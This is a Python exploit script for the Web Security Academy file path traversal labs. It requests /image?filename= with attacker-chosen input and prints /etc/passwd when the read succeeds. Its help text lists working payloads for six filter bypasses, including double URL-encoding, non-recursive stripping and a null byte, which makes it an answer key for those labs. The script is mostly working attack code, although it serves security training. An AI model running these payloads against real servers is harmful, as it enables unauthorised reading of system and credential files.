#!/usr/bin/env python3 

import requests
import urllib3
import argparse
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""File Path Traversal Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "../../../etc/passwd" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "../../../etc/passwd" 

1. File path traversal, simple case solution: ../../../etc/passwd

2. File path traversal, traversal sequences blocked with absolute path bypass solution: /etc/passwd

3. File path traversal, traversal sequences stripped non-recursively solution: ....//....//....//etc/passwd

4. File path traversal, traversal sequences stripped with superfluous URL-decode solution: %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

5. File path traversal, validation of start of path solution: /var/www/images/../../../etc/passwd

6. File path traversal, validation of file extension with null byte bypass solution: ../../../etc/passwd%00.png
(The script works but an error is shown in terminal)
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: ../../../etc/passwd', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command

def file_traversal(url, command):
    path = '/image?filename='
    path_command = path + command
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        r = requests.get(url + path_command, verify=False, proxies=proxies)
    else:
        r = requests.get(url + path_command, verify=False)
        # verify the response contains root user
        if (b'root' in r.content):
            print("The first line of /etc/passwd is: ")
            first_row = r.content.split(b'\n')[0]
            print(first_row.decode("utf-8"))
            print("(+) File Path Traversal Successful!")
        else:
            print("(-) File Path Traversal Failed")

def main():
    
    print("(+) Exploiting File Path Traversal")
        
    file_traversal(url, command)

if __name__ == "__main__":
    main()
